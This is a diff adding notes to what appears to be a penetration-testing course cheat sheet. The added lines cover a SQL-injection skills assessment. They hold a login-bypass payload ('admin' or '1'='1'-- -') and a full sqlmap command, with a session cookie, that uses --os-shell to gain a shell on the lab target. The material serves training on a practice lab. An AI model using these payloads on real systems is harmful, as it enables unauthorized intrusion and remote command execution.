@@ -97,5 +97,9 @@ Value Fuzzing (POST):         ffuf -w /usr/share/seclists/Usernames/xato-net-10-
 ### SQL Injection Fundamentals:
 ---
 #### Skills Assessment :
-```
-```
+
+#### For the login:
+``` admin' or '1'='1'-- - ```
+#### After the login (copy the the request from the browser as cURL):
+``` sqlmap 'http://94.237.62 <SNIP> .php' -H 'Cookie: PHPSESSID=avgi9hf5r3hj0kfuh4573o7rr6' -H 'Upgrade-Insecure-Requests: 1' -H 'Priority: u=0, i' --data-raw 'search=sdsdsds' --data 'search=*' --os-shell --batch
+ ```
